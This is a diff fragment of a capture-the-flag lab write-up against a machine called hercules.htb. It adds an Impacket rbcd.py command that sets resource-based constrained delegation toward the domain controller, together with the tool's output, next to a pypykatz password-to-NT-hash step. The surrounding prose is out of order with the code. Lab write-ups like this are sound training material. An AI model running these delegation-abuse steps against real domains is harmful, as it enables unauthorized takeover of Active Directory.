@@ -1594,8 +1594,20 @@ pypykatz crypto nt 'Password123!'
 The first step is to convert the password i set to an NTLM
 
 ```python
+rbcd.py -delegate-from 'iis_webserver$' -delegate-to 'DC$' -dc-ip '10.129.58.200' -action 'write' 'hercules.htb/iis_webserver$' -k -no-pass -dc-host dc.hercules.htb
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Accounts allowed to act on behalf of other identity:
+[*]     iis_webserver$   (S-1-5-21-1889966460-2597381952-958560702-1124)
+[*] iis_webserver$ can already impersonate users on DC$ via S4U2Proxy
+[*] Not modifying the delegation rights.
+[*] Accounts allowed to act on behalf of other identity:
+[*]     iis_webserver$   (S-1-5-21-1889966460-2597381952-958560702-1124)
 ```
+
+Then ill configure the RBCD
+
+
 
 
 
